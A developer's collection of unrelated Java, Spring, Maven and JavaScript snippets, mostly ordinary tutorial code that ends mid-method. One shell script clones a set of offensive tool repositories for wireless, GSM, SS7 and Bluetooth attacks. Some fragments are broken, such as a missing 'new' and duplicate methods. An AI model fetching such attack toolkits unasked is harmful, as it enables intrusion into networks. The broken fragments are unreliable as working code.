public interface CalculatorService {


    /**
     * 
     * @param arg1
     * @param arg0
     * @return
     *     returns double
     */
    @WebMethod
    @WebResult(targetNamespace = "")
    @RequestWrapper(localName = "multiply", targetNamespace = "http://samples.spring.jaxws.cxf.apache.chathurangaonline.com/", className = "com.chathurangaonline.apache.cxf.jaxws.spring.samples.Multiply")
    @ResponseWrapper(localName = "multiplyResponse", targetNamespace = "http://samples.spring.jaxws.cxf.apache.chathurangaonline.com/", className = "com.chathurangaonline.apache.cxf.jaxws.spring.samples.MultiplyResponse")
    public double multiply(
        @WebParam(name = "arg0", targetNamespace = "")
        double arg0,
        @WebParam(name = "arg1", targetNamespace = "")
        double arg1);

}
--------------------------------------------------------------------------------------------------------
import javax.servlet.ServletException;
import javax.servlet.annotation.WebInitParam;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * <p>
 *     you can see that we can pass init param for the servlet through the annotations.
 * </p>
 */
@WebServlet(
        name = "hello",
        urlPatterns = {"/hello"},
        initParams = {
                @WebInitParam(name = "username",value = "chathuranga"),
                @WebInitParam(name = "email",value = "chathuranga.t@gmail.com")
        },
        loadOnStartup = 1
)
public class HelloServlet extends HttpServlet{

    private static final Logger logger = LoggerFactory.getLogger(HelloServlet.class);

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        logger.info(" this servlet will be executed after executing the all relevant filters according to their order ");
        response.setContentType("text/plain");
        response.getWriter().write(" Welcome to Servlet Annotation with Servlet 3");
    }
}
--------------------------------------------------------------------------------------------------------
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

/**
 * <p>
 *     filter execution order has been defined in the web.xml file
 * </p>
 */
@WebFilter(
        filterName = "helloFilterOne",
        urlPatterns = {"/hello"}

)
public class FilterOne implements Filter{

    private FilterConfig filterConfig;
    private static final Logger logger = LoggerFactory.getLogger(FilterOne.class);

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        this.filterConfig = filterConfig;
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        logger.info(" inside the filter one ");
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
       //releasing the resources
    }
}
--------------------------------------------------------------------------------------------------------
import com.hsenidmobile.recruitment.model.EmailMessage;
import org.apache.commons.lang.StringUtils;
import org.apache.velocity.app.VelocityEngine;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.io.ClassPathResource;
import org.springframework.core.io.FileSystemResource;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.mail.javamail.MimeMessageHelper;
import org.springframework.mail.javamail.MimeMessagePreparator;
import org.springframework.stereotype.Component;
import org.springframework.ui.velocity.VelocityEngineUtils;

import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.io.File;

@Component("emailSender")
public class EmailSender {

    @Autowired
    private JavaMailSender mailSender;

    @Autowired
    private VelocityEngine velocityEngine;


    public void sendEmail(final String toEmailAddresses, final String fromEmailAddress,
                          final String subject) {
        sendEmail(toEmailAddresses, fromEmailAddress, subject, null, null,null);
    }

//    public void sendEmailWithAttachment(final String toEmailAddresses, final String fromEmailAddress,
//                                        final String subject, final String attachmentPath,
//                                        final String attachmentName) {
//        sendEmail(toEmailAddresses, fromEmailAddress, subject, attachmentPath, attachmentName);
//    }

//    private void sendEmail(final String toEmailAddresses, final String fromEmailAddress,
//                           final String subject, final String attachmentPath,
//                           final String attachmentName) {
//        MimeMessagePreparator preparator = new MimeMessagePreparator() {
//            public void prepare(MimeMessage mimeMessage) throws Exception {
//                MimeMessageHelper message = new MimeMessageHelper(mimeMessage, true);
//                message.setTo(toEmailAddresses);
//                message.setFrom(new InternetAddress(fromEmailAddress));
//                message.setSubject(subject);
//                String body = VelocityEngineUtils.mergeTemplateIntoString(
//                        velocityEngine, "templates/reminder.vm", "UTF-8", null);
//                message.setText(body, true);
//                if (!StringUtils.isBlank(attachmentPath)) {
//                    FileSystemResource file = new FileSystemResource(attachmentPath);
//                    message.addAttachment(attachmentName, file);
//                }
//            }
//        };
//        this.mailSender.send(preparator);
//    }



    private void sendEmail(final String toEmailAddresses, final String fromEmailAddress,
                           final String subject, final String attachmentPath,
                           final String attachmentName,final String image) {
        MimeMessagePreparator preparator = new MimeMessagePreparator() {
            public void prepare(MimeMessage mimeMessage) throws Exception {
                MimeMessageHelper message = new MimeMessageHelper(mimeMessage, true);
                message.setTo(toEmailAddresses);
                message.setFrom(new InternetAddress(fromEmailAddress));
                message.setSubject(subject);
                String body = VelocityEngineUtils.mergeTemplateIntoString(
                        velocityEngine, "templates/reminder.vm", "UTF-8", null);
                message.setText(body, true);
                //  message.addInline(image, new ClassPathResource("templates/staticmap.png"));
                message.addInline("image", new ClassPathResource("templates/staticmap.png"));
                if (!StringUtils.isBlank(attachmentPath)) {
                    FileSystemResource file = new FileSystemResource(attachmentPath);
                    message.addAttachment(attachmentName, file);
                }
            }
        };
        this.mailSender.send(preparator);
    }



    public void sendEmail(final EmailMessage emailMessage){
        MimeMessagePreparator preparator = new MimeMessagePreparator() {
            public void prepare(MimeMessage mimeMessage) throws Exception {
                MimeMessageHelper message = new MimeMessageHelper(mimeMessage, true);
                message.setTo(emailMessage.getToAddress());
                message.setFrom(new InternetAddress(emailMessage.getFrom()));
                message.setSubject(emailMessage.getEmailTemplate().getSubject());
                String body = VelocityEngineUtils.mergeTemplateIntoString(
                        velocityEngine, "templates/reminder.vm", "UTF-8", null);
                message.setText(body, true);
                FileSystemResource img = new FileSystemResource(new File("templates/staticmap.png"));
                message.addInline("imgId", img);
//               if (!StringUtils.isBlank(attachmentPath)) {
//                   FileSystemResource file = new FileSystemResource(attachmentPath);
//                   message.addAttachment(attachmentName, file);
//               }
            }
        };
        //sending email as a thread
        EmailService emailService = new EmailService(preparator,mailSender);
        emailService.start();
    }
}
--------------------------------------------------------------------------------------------------------
import com.chathurangaonline.examples.dao.GenericDao;
import com.chathurangaonline.examples.exception.ApplicationException;
import org.hibernate.Criteria;
import org.hibernate.HibernateException;
import org.hibernate.Session;
import org.hibernate.SessionFactory;
import org.hibernate.boot.registry.StandardServiceRegistryBuilder;
import org.hibernate.cfg.Configuration;
import org.hibernate.service.ServiceRegistry;
import java.io.Serializable;
import java.util.List;


public  class GenericDaoImpl<T,PK extends Serializable>  implements GenericDao<T,PK>{

    private Class<T> entityClass;

    private static SessionFactory sessionFactory;

    public GenericDaoImpl(Class<T> entityClass) {
        this.entityClass = entityClass;
    }

    public SessionFactory getSessionFactory(){
        if(sessionFactory==null){
            Configuration configuration = new Configuration();
            configuration.configure();
            ServiceRegistry serviceRegistry = new StandardServiceRegistryBuilder().applySettings(configuration.getProperties()).build();
            sessionFactory = configuration.buildSessionFactory(serviceRegistry);
        }
        return sessionFactory;
    }

    public   Session getSession(){
        SessionFactory sessionFactory = this.getSessionFactory();
        return sessionFactory.openSession();
    }

    @Override
    public T findById(Serializable id) {
        T object = null;
        if(id!=null){
            Session session = this.getSession();
            object =  (T)session.get(entityClass,id);
            return object;
        }
        return object;
    }


    @Override
    public void save(T object) {
        Session session = null;
        try{
            session = getSession();
            session.beginTransaction();
            session.save(object);
            session.getTransaction().commit();
        }
        catch (HibernateException ex){
            if(session!=null && session.getTransaction()!=null){
                session.getTransaction().rollback();
            }
            throw new ApplicationException("ERROR_SAVE",ex);
        }
        finally {
            if(session!=null){
                session.close();
            }
        }
    }


    @Override
    public List<T> findAll() {
        return null;  //To change body of implemented methods use File | Settings | File Templates.
    }

    @Override
    public Integer countAll() {
        return null;  //To change body of implemented methods use File | Settings | File Templates.
    }

    @Override
    public void delete(T object) {
        if(object!=null){
            Session session = null;
            try{
                session = this.getSessionFactory().openSession();
                session.beginTransaction();
                session.delete(object);
                session.getTransaction().commit();
            }
            catch (HibernateException ex){
                if(session!=null && session.getTransaction()!=null){
                    session.getTransaction().rollback();
                }
                throw new ApplicationException("ERROR_DELETE",ex);
            }
            finally {
                if(session!=null){
                    session.close();
                }
            }
        }
    }



    public Class<T> getEntityClass() {
        return entityClass;
    }

    public void setEntityClass(Class<T> entityClass) {
        this.entityClass = entityClass;
    }
}
--------------------------------------------------------------------------------------------------------
    ByteArrayHttpMessageConverter – converts byte arrays
    StringHttpMessageConverter – converts Strings
    ResourceHttpMessageConverter – converts org.springframework.core.io.Resource for any type of octet stream
    SourceHttpMessageConverter – converts javax.xml.transform.Source
    FormHttpMessageConverter – converts form data to/from a MultiValueMap<String, String>.
    Jaxb2RootElementHttpMessageConverter – converts Java objects to/from XML (added only if JAXB2 is present on the classpath)
    MappingJackson2HttpMessageConverter – converts JSON (added only if Jackson 2 is present on the classpath)
    MappingJacksonHttpMessageConverter – converts JSON (added only if Jackson is present on the classpath)
    AtomFeedHttpMessageConverter – converts Atom feeds (added only if Rome is present on the classpath)
    RssChannelHttpMessageConverter – converts RSS feeds (added only if Rome is present on the classpath)
--------------------------------------------------------------------------------------------------------
@Bean
public HttpMessageConverter<Object> createXmlHttpMessageConverter() {
    MarshallingHttpMessageConverter xmlConverter = new MarshallingHttpMessageConverter();
 
    // ...
 
    return xmlConverter;
}

@Test
public void givenConsumingXml_whenReadingTheFoo_thenCorrect() {
    String URI = BASE_URI + "foos/{id}";
    RestTemplate restTemplate = new RestTemplate();
    restTemplate.setMessageConverters(getMessageConverters());
 
    HttpHeaders headers = new HttpHeaders();
    headers.setAccept(Arrays.asList(MediaType.APPLICATION_XML));
    HttpEntity<String> entity = new HttpEntity<String>(headers);
 
    ResponseEntity<Foo> response = 
      restTemplate.exchange(URI, HttpMethod.GET, entity, Foo.class, "1");
    Foo resource = response.getBody();
 
    assertThat(resource, notNullValue());
}
private List<HttpMessageConverter<?>> getMessageConverters() {
    XStreamMarshaller marshaller = new XStreamMarshaller();
    MarshallingHttpMessageConverter marshallingConverter = 
      new MarshallingHttpMessageConverter(marshaller);
     
    List<HttpMessageConverter<?>> converters = 
      ArrayList<HttpMessageConverter<?>>();
    converters.add(marshallingConverter);
    return converters; 
}

@Test
public void givenConsumingJson_whenReadingTheFoo_thenCorrect() {
    String URI = BASE_URI + "foos/{id}";
 
    RestTemplate restTemplate = new RestTemplate();
    restTemplate.setMessageConverters(getMessageConverters());
 
    HttpHeaders headers = new HttpHeaders();
    headers.setAccept(Arrays.asList(MediaType.APPLICATION_JSON));
    HttpEntity<String> entity = new HttpEntity<String>(headers);
 
    ResponseEntity<Foo> response = 
      restTemplate.exchange(URI, HttpMethod.GET, entity, Foo.class, "1");
    Foo resource = response.getBody();
 
    assertThat(resource, notNullValue());
}
private List<HttpMessageConverter<?>> getMessageConverters() {
    List<HttpMessageConverter<?>> converters = 
      new ArrayList<HttpMessageConverter<?>>();
    converters.add(new MappingJackson2HttpMessageConverter());
    return converters;
}

@Test
public void givenConsumingXml_whenWritingTheFoo_thenCorrect() {
    String URI = BASE_URI + "foos/{id}";
    RestTemplate restTemplate = new RestTemplate();
    restTemplate.setMessageConverters(getMessageConverters());
 
    Foo resource = new Foo(4, "jason");
    HttpHeaders headers = new HttpHeaders();
    headers.setAccept(Arrays.asList(MediaType.APPLICATION_JSON));
    headers.setContentType((MediaType.APPLICATION_XML));
    HttpEntity<Foo> entity = new HttpEntity<Foo>(resource, headers);
 
    ResponseEntity<Foo> response = restTemplate.exchange(
      URI, HttpMethod.PUT, entity, Foo.class, resource.getId());
    Foo fooResponse = response.getBody();
 
    Assert.assertEquals(resource.getId(), fooResponse.getId());
}
--------------------------------------------------------------------------------------------------------
spring:
  security:
    oauth2:
      resourceserver:
        id: http://localhost:8080/api
        jwk:
          jwk-set-uri: https://blog-samples.auth0.com/.well-known/jwks.json
          issuer-uri: https://blog-samples.auth0.com/
--------------------------------------------------------------------------------------------------------

import com.example.movieapi.model.Movie;
import com.example.movieapi.model.repository.MovieRepository;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;

@RestController
@RequestMapping("/movies")
public class MovieController {

    private MovieRepository movieRepository;

    public MovieController(MovieRepository movieRepository){
        this.movieRepository = movieRepository;
    }

    @GetMapping
    public Flux<Movie> getMovies(){
        return movieRepository.findAll();
    }

    @GetMapping("{id}")
    public Mono<ResponseEntity<Movie>> getMovie(@PathVariable String id){
        return movieRepository.findById(id)
                .map(ResponseEntity::ok)
                .defaultIfEmpty(ResponseEntity.notFound().build());
    }


    @PostMapping
    @ResponseStatus(HttpStatus.CREATED)
    public Mono<Movie> saveMovie(@RequestBody Movie movie){
        return movieRepository.save(movie);
    }

    @PutMapping("{id}")
    public Mono<ResponseEntity<Movie>> updateMovie(@PathVariable(value = "id") String id, @RequestBody Movie movie){
        return movieRepository.findById(id)
                .flatMap(existingMovie -> {
                    existingMovie.setName(movie.getName());
                    existingMovie.setGenre(movie.getGenre());
                    existingMovie.setReleaseDate(movie.getReleaseDate());
                    return movieRepository.save(existingMovie);
                })
                .map(ResponseEntity::ok)
                .defaultIfEmpty(ResponseEntity.notFound().build());
    }

    @DeleteMapping("{id}")
    public Mono<ResponseEntity<Void>> deleteMovie(@PathVariable(value = "id") String id){
        return movieRepository.findById(id)
                .flatMap(existingMovie ->
                        movieRepository.delete(existingMovie)
                                .then(Mono.just(ResponseEntity.ok().<Void>build()))
                )
                .defaultIfEmpty(ResponseEntity.notFound().build());
    }

    @DeleteMapping
    public Mono<Void> deleteAllMovies(){
        return movieRepository.deleteAll();
    }
}
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.annotation.web.reactive.EnableWebFluxSecurity;
import org.springframework.security.config.web.server.ServerHttpSecurity;
import org.springframework.security.oauth2.jwt.ReactiveJwtDecoder;
import org.springframework.security.oauth2.jwt.ReactiveJwtDecoders;
import org.springframework.security.web.server.SecurityWebFilterChain;

@EnableWebFluxSecurity
public class SecurityConfig {

    @Value("${spring.security.oauth2.resourceserver.jwk.issuer-uri}")
    private String issuerUri;

    @Bean
    public SecurityWebFilterChain securityWebFilterChain(ServerHttpSecurity http){
        http
                .authorizeExchange()
                .pathMatchers(HttpMethod.GET,"/movies/**").permitAll()
                .anyExchange().authenticated()
                .and()
                .oauth2ResourceServer()
                .jwt();
        return http.build();
    }

    @Bean
    public ReactiveJwtDecoder jwtDecoder() {
        return ReactiveJwtDecoders.fromOidcIssuerLocation(issuerUri);
    }
}
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import com.example.movieapi.model.Movie;
import com.example.movieapi.model.repository.MovieRepository;
import org.springframework.boot.CommandLineRunner;
import org.springframework.context.annotation.Bean;
import org.springframework.data.mongodb.core.ReactiveMongoOperations;
import reactor.core.publisher.Flux;

import java.time.LocalDateTime;

@SpringBootApplication
public class MovieApiApplication {

	public static void main(String[] args) {
		SpringApplication.run(MovieApiApplication.class, args);
	}

	//Keep the rest of the code untouched. Just add the following method
	@Bean
	CommandLineRunner init(ReactiveMongoOperations operations, MovieRepository movieRepository) {
		return args -> {
			Flux<Movie> productFlux = Flux.just(
					new Movie(null, "Avenger: Infinity Wars", "Action", LocalDateTime.now()),
					new Movie(null, "Gladiator", "Drama/Action", LocalDateTime.now()),
					new Movie(null, "Black Panther", "Action", LocalDateTime.now()))
					.flatMap(movieRepository::save);

			productFlux
					.thenMany(movieRepository.findAll())
					.subscribe(System.out::println);
		};
	}
}

--------------------------------------------------------------------------------------------------------

import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.integration.channel.PublishSubscribeChannel;
import org.springframework.integration.dsl.IntegrationFlow;
import org.springframework.integration.dsl.IntegrationFlows;
import org.springframework.integration.file.dsl.FileInboundChannelAdapterSpec;
import org.springframework.integration.file.dsl.Files;
import org.springframework.messaging.MessageHandler;
import org.springframework.web.reactive.HandlerMapping;
import org.springframework.web.reactive.handler.SimpleUrlHandlerMapping;
import org.springframework.web.reactive.socket.WebSocketHandler;
import org.springframework.web.reactive.socket.WebSocketMessage;
import org.springframework.web.reactive.socket.server.support.WebSocketHandlerAdapter;
import reactor.core.publisher.Flux;
import reactor.core.publisher.FluxSink;

import java.io.File;
import java.util.Collections;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Consumer;


@Configuration
public class WebSocketConfiguration {
    @Bean
    public IntegrationFlow fileFlow(PublishSubscribeChannel channel, @Value("file://${HOME}/Desktop/in") File file) {
        FileInboundChannelAdapterSpec in = Files.inboundAdapter(file).autoCreateDirectory(true);
//        return IntegrationFlows.from(
//        in,
//                new Consumer<SourcePollingChannelAdapterSpec>() {
//                    @Override
//                    public void accept(SourcePollingChannelAdapterSpec p) {
//                        p.poller(new Function<PollerFactory, PollerSpec>() {
//                            @Override
//                            public PollerSpec apply(PollerFactory pollerFactory) {
//                                return pollerFactory.fixedRate(1000);
//                            }
//                        });
//                    }
//                }
        return IntegrationFlows.from(
                in,
                p -> p.poller(pollerFactory -> {
                    return pollerFactory.fixedRate(1000);
                })
        ).channel(channel).get();
    }

    @Bean
    @Primary
    public PublishSubscribeChannel incomingFilesChannel() {
        return new PublishSubscribeChannel();
    }

    @Bean
    public WebSocketHandlerAdapter webSocketHandlerAdapter() {
        return new WebSocketHandlerAdapter();
    }

    @Bean
    public WebSocketHandler webSocketHandler(PublishSubscribeChannel channel) {
        return session -> {
            Map<String, MessageHandler> connections = new ConcurrentHashMap<>();
            Flux<WebSocketMessage> publisher = Flux.create((Consumer<FluxSink<WebSocketMessage>>) fluxSink -> {
                connections.put(session.getId(), new ForwardingMessageHandler(session, fluxSink));
                channel.subscribe(connections.get(session.getId()));
            }).doFinally(signalType -> {
                channel.unsubscribe(connections.get(session.getId()));
                connections.remove(session.getId());
            });
            return session.send(publisher);
        };
    }

    @Bean
    public HandlerMapping handlerMapping(WebSocketHandler webSocketHandler) {
        SimpleUrlHandlerMapping handlerMapping = new SimpleUrlHandlerMapping();
        handlerMapping.setOrder(10);
        handlerMapping.setUrlMap(Collections.singletonMap("/ws/files", webSocketHandler));
        return handlerMapping;
    }
}
--------------------------------------------------------------------------------------------------------
curl http://localhost:8080/exams

curl -X POST -H "Content-Type: application/json" -d '{
    "title": "First exam"
}' http://localhost:8080/exams

curl -X POST -H "Content-Type: application/json" -d '{
    "title": "Another show exam",
    "description": "Another show exam desc"
}' http://localhost:8080/exams

curl -X POST -H "Content-Type: application/json" -d '{
    "title": "First exam",
    "description": "Just a test",
    "url": "trying-to-hack",
    "published": true
}' http://localhost:8080/exams

curl -X PUT -H "Content-Type: application/json" -d '{
    "title": "First exam",
    "description": "Just a test",
    "url": "trying-to-hack",
    "published": true
}' http://localhost:8080/exams

curl -X PUT -H "Content-Type: application/json" -d '{
    "id": 1,
    "title": "First exam",
    "description": "Just a test"
}' http://localhost:8080/exams

curl -X PUT -H "Content-Type: application/json" -d '{
    "id": 2,
    "title": "The third exam is amazing",
    "description": "Just a test"
}' http://localhost:8080/exams
--------------------------------------------------------------------------------------------------------
alter table exam
  add column created_at timestamp without time zone not null default now(),
  add column edited_at timestamp without time zone not null default now(),
  add column published boolean not null default false;
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter;
import org.springframework.security.web.util.matcher.AntPathRequestMatcher;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.Collections;

public class JWTLoginFilter extends AbstractAuthenticationProcessingFilter {

    public JWTLoginFilter(String url, AuthenticationManager authManager) {
        super(new AntPathRequestMatcher(url));
        setAuthenticationManager(authManager);
    }

    @Override
    public Authentication attemptAuthentication(
            HttpServletRequest req, HttpServletResponse res)
            throws AuthenticationException, IOException, ServletException {
        AccountCredentials creds = new ObjectMapper()
                .readValue(req.getInputStream(), AccountCredentials.class);
        return getAuthenticationManager().authenticate(
                new UsernamePasswordAuthenticationToken(
                        creds.getUsername(),
                        creds.getPassword(),
                        Collections.emptyList()
                )
        );
    }

    @Override
    protected void successfulAuthentication(
            HttpServletRequest req,
            HttpServletResponse res, FilterChain chain,
            Authentication auth) throws IOException, ServletException {
        TokenAuthenticationService
                .addAuthentication(res, auth.getName());
    }
}
--------------------------------------------------------------------------------------------------------
mvn spring-boot:run -Drun.arguments="--auth0.secret=YOUR_SECRET_KEY"
--------------------------------------------------------------------------------------------------------
import feign.Feign;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.config.ConfigurableBeanFactory;
import org.springframework.boot.autoconfigure.condition.ConditionalOnClass;
import org.springframework.cloud.openfeign.AnnotatedParameterProcessor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.MethodParameter;
import org.springframework.core.convert.ConversionService;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.method.annotation.RequestHeaderMethodArgumentResolver;
import org.springframework.web.method.support.HandlerMethodArgumentResolver;
import org.springframework.web.servlet.mvc.method.annotation.PathVariableMethodArgumentResolver;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter;
import org.springframework.web.servlet.mvc.method.annotation.RequestResponseBodyMethodProcessor;
import org.springframework.web.servlet.mvc.method.annotation.ServletCookieValueMethodArgumentResolver;

import javax.annotation.PostConstruct;
import javax.validation.Valid;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

/**
 * VenusFeignAutoConfig
 *
 * @author Charles He
 */
@Configuration
@ConditionalOnClass(Feign.class)
public class VenusFeignAutoConfig {

    @Autowired
    private RequestMappingHandlerAdapter adapter;

    @Autowired
    private ConfigurableBeanFactory beanFactory;

    @Bean
    public VenusRequestInterceptor feignRequestInterceptor() {
        return new VenusRequestInterceptor();
    }

    @Bean
    public VenusSpringMvcContract feignSpringMvcContract(@Autowired(required = false) List<AnnotatedParameterProcessor> parameterProcessors,
                                                         ConversionService conversionService) {
        if (null == parameterProcessors) {
            parameterProcessors = new ArrayList<>();
        }
        return new VenusSpringMvcContract(parameterProcessors, conversionService);
    }

    public static MethodParameter interfaceMethodParameter(MethodParameter parameter, Class annotationType) {
        if (!parameter.hasParameterAnnotation(annotationType)) {
            for (Class<?> itf : parameter.getDeclaringClass().getInterfaces()) {
                try {
                    Method method = itf.getMethod(parameter.getMethod().getName(), parameter.getMethod().getParameterTypes());
                    MethodParameter itfParameter = new MethodParameter(method, parameter.getParameterIndex());
                    if (itfParameter.hasParameterAnnotation(annotationType)) {
                        return itfParameter;
                    }
                } catch (NoSuchMethodException e) {
                    continue;
                }
            }
        }
        return parameter;
    }

    @PostConstruct
    public void modifyArgumentResolvers() {
        List<HandlerMethodArgumentResolver> list = new ArrayList<>(adapter.getArgumentResolvers());

        // PathVariable 支持接口注解
        list.add(0, new PathVariableMethodArgumentResolver() {
            @Override
            public boolean supportsParameter(MethodParameter parameter) {
                return super.supportsParameter(interfaceMethodParameter(parameter, PathVariable.class));
            }

            @Override
            protected NamedValueInfo createNamedValueInfo(MethodParameter parameter) {
                return super.createNamedValueInfo(interfaceMethodParameter(parameter, PathVariable.class));
            }
        });

        // RequestHeader 支持接口注解
        list.add(0, new RequestHeaderMethodArgumentResolver(beanFactory) {
            @Override
            public boolean supportsParameter(MethodParameter parameter) {
                return super.supportsParameter(interfaceMethodParameter(parameter, RequestHeader.class));
            }

            @Override
            protected NamedValueInfo createNamedValueInfo(MethodParameter parameter) {
                return super.createNamedValueInfo(interfaceMethodParameter(parameter, RequestHeader.class));
            }
        });

        // CookieValue 支持接口注解
        list.add(0, new ServletCookieValueMethodArgumentResolver(beanFactory) {
            @Override
            public boolean supportsParameter(MethodParameter parameter) {
                return super.supportsParameter(interfaceMethodParameter(parameter, CookieValue.class));
            }

            @Override
            protected NamedValueInfo createNamedValueInfo(MethodParameter parameter) {
                return super.createNamedValueInfo(interfaceMethodParameter(parameter, CookieValue.class));
            }
        });

        // RequestBody Valid 支持接口注解
        list.add(0, new RequestResponseBodyMethodProcessor(adapter.getMessageConverters()) {
            @Override
            public boolean supportsParameter(MethodParameter parameter) {
                return super.supportsParameter(interfaceMethodParameter(parameter, RequestBody.class));
            }

            @Override
            protected void validateIfApplicable(WebDataBinder binder, MethodParameter methodParam) {
                super.validateIfApplicable(binder, interfaceMethodParameter(methodParam, Valid.class));
            }
        });

        // 修改ArgumentResolvers, 支持接口注解
        adapter.setArgumentResolvers(list);
    }
}

https://github.com/SpringCloud/venus-cloud-feign/blob/master/venus-cloud-feign-core/src/main/java/cn/springcloud/feign/VenusFeignAutoConfig.java
--------------------------------------------------------------------------------------------------------
mvn help:describe -Dcmd= compile
mvn help:describe -Dplugin=compiler
mvn help:describe -Dcmd= dependency:get
mvn dependency:list
mvn help:effective-pom
mvn compiler:compile

mvn tomcat7:deploy
mvn tomcat7:redeploy
mvn tomcat7:undeploy

mvn install:install-file
-Dfile="D:\thirdParty\jortho.jar"
-DgroupId=com.inet.jortho
-DartifactId=jortho 
-Dversion=1.0 
-Dpackaging=jar

mvn    archetype:generate   -DgroupId={ project-group-id}    - DartifactId={ project-name}    - DarchetypeArtifactId= maven-archetype-quickstart   - DinteractiveMode= false 

mvn  exec:java -Dexec.mainClass="com.logicbig.App"

mvn -Dmaven.surefire.debug test
mvn -Dmaven.surefire.debug="-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8000 -Xnoagent -Djava.compiler=NONE" test

mvn -q test
mvn -q test -Dtest=TestClass3
mvn -q test -Dtest=TestClass3,TestClass1
mvn -q test -Dtest=T*lass1
mvn -q test -Dtest=TestClass2#test4
mvn -q test -Dtest=#test4
mvn -q  test -Dtest=TestClass3#test5+test7
mvn -q test "-Dtest=!TestClass1"

                    <compilerArgs>
                        <arg>-g</arg>
                        <arg>-Xlint</arg>
                     </compilerArgs>
--------------------------------------------------------------------------------------------------------
let compare = Symbol();
class Math {
    constructor() {
        this.desc = "math utility";
    }
    //a method
    [compare](x, y) {
        return x === y ? 0 : x < y ? -1 : 1;
    }
}

let math = new Math();
console.log(math);
let doCompare = math[compare];
let result = doCompare(7, 5);
console.log(result);
--------------------------------------------------------------------------------------------------------
function shape(inputClass) {
    return class extends inputClass {
        draw() {
            console.log("shape is drawing");
        }
    };
}

function component(inputClass) {
    return class extends inputClass {
        display() {
            console.log("component is displaying");
        }
    };
}

class Rectangle {
    constructor(w, h) {
        this.w = w;
        this.h = h;
    }
    area() {
        return this.w * this.h;
    }
}

let SquareBase = shape(component(Rectangle));
//above is equivalent to: class Shape extends (class Component extends Rectangle{}){}

class Square extends SquareBase {
    constructor(sideLength) {
        super(sideLength, sideLength); //calling Rectangle constructor
    }
}

let square = new Square(4);
square.draw();
square.display();
let area = square.area();
console.log(area);
--------------------------------------------------------------------------------------------------------
#!/bin/sh

git clone --recursive git://github.com/0x90/wifi-arsenal
git clone --recursive git://github.com/0x90/ism-arsenal
git clone --recursive git://github.com/0x90/gsm-arsenal
git clone --recursive git://github.com/0x90/bluetooth-arsenal
git clone --recursive git://github.com/0x90/sdr-arsenal
git clone --recursive git://github.com/0x90/atheros-arsenal
git clone --recursive git://github.com/0x90/broadcom-arsenal
git clone --recursive git://github.com/0x90/firmware-arsenal
git clone --recursive git://github.com/0x90/esp-arsenal
git clone --recursive git://github.com/0x90/vpn-arsenal
git clone --recursive git://github.com/0x90/ss7-arsenal
git clone --recursive git://github.com/0x90/nrf51-arsenal
git clone --recursive git://github.com/0x90/nrf24-arsenal
--------------------------------------------------------------------------------------------------------
    <dependency>
     <groupId>com.fasterxml.jackson.dataformat</groupId>
     <artifactId>jackson-dataformat-xml</artifactId>
    </dependency>
	    @GetMapping(path = "/{id}", produces = {MediaType.APPLICATION_JSON_VALUE, MediaType.APPLICATION_XML_VALUE})
    public UserModel getUser(@PathVariable String id)
    {
       // other code here to create UserModel object
     return userModel;
    }
--------------------------------------------------------------------------------------------------------
spring.jpa.hibernate.naming.physical-strategy=org.hibernate.boot.model.naming.PhysicalNamingStrategyStandardImpl
--------------------------------------------------------------------------------------------------------
ObjectQuotingStrategy originalStrategy = referenceDatabase.getObjectQuotingStrategy();
        try {
            referenceDatabase.setObjectQuotingStrategy(ObjectQuotingStrategy.QUOTE_ALL_OBJECTS);
            return SnapshotGeneratorFactory.getInstance().createSnapshot(schemas, targetDatabase, snapshotControl);
        } finally {
            referenceDatabase.setObjectQuotingStrategy(originalStrategy);
        }
--------------------------------------------------------------------------------------------------------
    @Transactional
    @Modifying
    @Query(value = "UPDATE Users u set EMAIL_VERIFICATION_STATUS =:emailVerificationStatus where u.USER_ID = :userId",
            nativeQuery = true)
void updateUser(@Param("emailVerificationStatus") boolean emailVerificationStatus, @Param("userId") String userId);

    @GetMapping("/products/page")
    @Timed
    @Override
    public ResponseEntity<Iterable<ProductGetResponse>> getAllProductRecords(@RequestParam(value = "page", defaultValue = "0") int page,
                                                                             @RequestParam(value = "limit", defaultValue = "30") int limit) {
